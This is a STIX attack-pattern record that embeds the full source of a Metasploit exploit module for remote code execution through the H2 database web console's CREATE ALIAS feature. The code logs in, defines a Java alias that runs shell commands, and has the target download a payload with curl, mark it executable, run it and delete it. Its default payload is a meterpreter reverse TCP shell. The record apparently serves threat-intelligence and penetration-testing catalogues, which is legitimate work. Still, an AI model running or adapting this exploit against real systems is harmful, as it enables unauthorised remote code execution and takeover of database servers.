{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7efff149-5825-429e-b044-0f8d21f8efd1",
    "created": "2024-08-14T17:04:06.080433Z",
    "modified": "2024-08-14T17:04:06.080437Z",
    "name": "H2 Web Interface Create Alias RCE",
    "description": " The H2 database contains an alias function which allows for arbitrary Java code to be used. This functionality can be abused to create an exec functionality to pull our payload down and execute it. H2's web interface contains restricts MANY characters, so injecting a payload directly is not favorable. A valid database connection is required. If the database engine was configured to allow creation of databases, the module default can be used which utilizes an in memory database. Some Docker instances of H2 don't allow writing to folders such as /tmp, so we default to writing to the working directory of the software.  This module was tested against H2 version 2.1.214, 2.0.204, 1.4.199 (version detection fails)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/h2_webinterface_rce.rb",
            "external_id": "h2_webinterface_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2"
        },
        {
            "source_name": "reference",
            "url": "https://www.h2database.com/html/commands.html#create_alias"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'H2 Web Interface Create Alias RCE',\n        'Description' => %q{\n          The H2 database contains an alias function which allows for arbitrary Java code to be used.\n          This functionality can be abused to create an exec functionality to pull our payload down\n          and execute it. H2's web interface contains restricts MANY characters, so injecting a payload\n          directly is not favorable. A valid database connection is required. If the database engine\n          was configured to allow creation of databases, the module default can be used which\n          utilizes an in memory database. Some Docker instances of H2 don't allow writing to\n          folders such as /tmp, so we default to writing to the working directory of the software.\n\n          This module was tested against H2 version 2.1.214, 2.0.204, 1.4.199 (version detection fails)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'gambler', # edb 44422\n          'h4ckNinja', # edb 45506\n          'Nairuz Abulhul' # medium write-up\n        ],\n        'References' => [\n          [ 'EDB', '44422'],\n          [ 'EDB', '45506'],\n          [ 'URL', 'https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2'],\n          [ 'URL', 'https://www.h2database.com/html/commands.html#create_alias']\n        ],\n        'Stance' => Stance::Aggressive,\n        'Platform' => 'unix',\n        'Arch' => [ARCH_CMD],\n        'Privileged' => false,\n        'Payload' => {\n          # likely more, these aren't really used now that we go with a curl\n          # to retrieve our payload, but leaving here for future travelers\n          'BadChars' => '\"<>;|`\\\\'\n        },\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2018-04-09', # first EDB link, prob older since this seems to be a 'feature'\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'NOCVE' => ['abusing a feature']\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8082),\n        OptString.new('USERNAME', [ true, 'User to login with', '']),\n        OptString.new('PASSWORD', [ true, 'Password to login with', '']),\n        OptString.new('DATABASE', [ true, 'Database to use', 'jdbc:h2:mem:']),\n        OptString.new('TARGETURI', [ true, 'The URI of the H2 web interface', '/']),\n        OptBool.new('GETVERSION', [ true, 'Get the version of the database before exploiting', true])\n      ]\n    )\n  end\n\n  def get_jsessionid\n    vprint_status('Obtaining jsessionid (cookie equivalent)')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'method' => 'GET'\n    )\n    return nil if res.nil?\n    return nil unless res.code == 200\n\n    if res.body =~ /location.href = 'login\\.jsp\\?jsessionid=([^']+)';/\n      vprint_good(\"jsessionid (cookie equivalent): #{Regexp.last_match(1)}\")\n      return Regexp.last_match(1)\n    else\n      return nil\n    end\n  end\n\n  def login(check_only: false)\n    page = 'login.do'\n    if check_only\n      page = 'test.do'\n    end\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, page),\n      'method' => 'POST',\n      'vars_get' => {\n        'jsessionid' => @jsessionid\n      },\n      'vars_post' => {\n        'language' => 'en',\n        'setting' => 'Generic+H2+%28Server%29',\n        'name' => 'Generic+H2+%28Server%29',\n        'driver' => 'org.h2.Driver',\n        'url' => datastore['DATABASE'],\n        'user' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n  end\n\n  def check\n    @jsessionid = get_jsessionid\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'method' => 'GET',\n      'vars_get' => {\n        'jsessionid' => @jsessionid\n      }\n    })\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n    return CheckCode::Unknown(\"#{peer} - H2 web interface not found\") unless res.body.include? '<title>H2 Console</title>'\n\n    print_status(\"Detected autofilled DB: #{Regexp.last_match(1)}\") if res.body =~ /<td class=\"login\"><input type=\"text\" name=\"url\" value=\"([^\"]+)\"/\n    print_status(\"Detected autofilled Username: #{Regexp.last_match(1)}\") if res.body =~ /<td class=\"login\"><input type=\"text\" name=\"user\" value=\"([^\"]+)\"/\n    res = login(check_only: true)\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    return CheckCode::Vulnerable(\"#{peer} - H2 web interface found, and database connection successful\") if res.body.include? 'Test successful'\n\n    CheckCode::Safe(\"#{peer} - H2 web interface found, however database connection NOT successful\")\n  end\n\n  def send_command(command)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'query.do'),\n      'method' => 'POST',\n      'vars_get' => {\n        'jsessionid' => @jsessionid\n      },\n      'vars_post' => {\n        'sql' => command\n      }\n    })\n    return nil if res.nil?\n    return nil if res.code != 200\n\n    res.body\n  end\n\n  def get_version\n    version = send_command('SELECT H2VERSION() FROM DUAL;')\n    # regex likely to break on version upgrades unfortunately\n    if version =~ %r{<table class=\"resultSet\" cellspacing=\"0\" cellpadding=\"0\"><tr><th>H2VERSION\\(\\)</th></tr><tr><td>([^<]+)</td></tr></table>}\n      print_good(\"H2 Version detected: #{Regexp.last_match(1)}\")\n      return\n    end\n    print_error('Unable to detect version')\n  end\n\n  def on_request_uri(cli, _request)\n    print_good('Received payload request')\n    send_response(cli, payload.encoded)\n  end\n\n  def exploit\n    @jsessionid ||= get_jsessionid\n\n    res = login\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    if datastore['GETVERSION']\n      get_version\n    end\n\n    start_service\n    alias_name = Rex::Text.rand_text_alpha_upper(6..12)\n    alias_function = %|CREATE ALIAS #{alias_name} AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\"); return s.hasNext() ? s.next() : \"\"; }$$;|\n    # escape single quotes with double single quotes, http://www.h2database.com/html/grammar.html\n    payload_name = \"#{Rex::Text.rand_text_alphanumeric(6..10)}.sh\"\n    vprint_status(\"Saving payload as #{payload_name}\")\n    run_alias = \"CALL #{alias_name}('curl #{get_uri} -o #{payload_name}');\n      CALL #{alias_name}('chmod a+x #{payload_name}');\n      CALL #{alias_name}('./#{payload_name} &');\n      CALL #{alias_name}('rm -rf #{payload_name}');\"\n    delete_alias = \"DROP ALIAS #{alias_name};\"\n    print_status('Attempting to execute payload retrieval')\n    send_command(\"#{alias_function} #{run_alias} #{delete_alias}\")\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-09, # first EDB link, prob older since this seems to be a feature",
    "x_mitre_platforms": [
        "unix'"
    ]
}